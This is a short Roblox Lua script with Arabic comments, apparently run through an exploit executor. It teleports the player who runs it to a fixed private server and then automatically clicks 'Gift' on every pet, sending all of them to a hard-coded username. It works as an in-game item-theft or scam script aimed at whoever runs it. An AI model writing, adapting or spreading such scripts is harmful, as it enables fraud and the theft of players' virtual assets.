-- رقم سيرفرك الخاص
local placeId = 2285776296 -- عدله إلى GameId أو PlaceId الخاص فيك
local serverJobId = "98a3ccbc-78f9-4bbf-a4a1-13c45dd7d50a" -- JobId الخاص بسيرفرك

-- الخطوة الأولى: نقل اللاعب إلى سيرفرك الخاص
game:GetService("TeleportService"):TeleportToPlaceInstance(placeId, serverJobId, game.Players.LocalPlayer)

-- الخطوة الثانية: بعد ما يدخل للسيرفر
-- سكربت إرسال الحيوانات كـ Gift
local function autoGiftAllPets(targetUsername)
    local petsGui = game.Players.LocalPlayer:WaitForChild("PlayerGui"):WaitForChild("ActivePets")
    
    for _, pet in pairs(petsGui:GetChildren()) do
        if pet:IsA("Frame") and pet:FindFirstChild("Gift") then
            fireclickdetector(pet.Gift:FindFirstChildOfClass("ClickDetector"))
            -- لو فيه مكان لإدخال اسم المستلم:
            -- game:GetService("VirtualInputManager"):SendText(targetUsername)
            wait(0.5)
        end
    end
end

-- تأخير بسيط عشان يتأكد من تحميل السيرفر
task.delay(5, function()
    autoGiftAllPets("GLO_ALOBE7") -- غيرها إلى اسم حسابك
end)
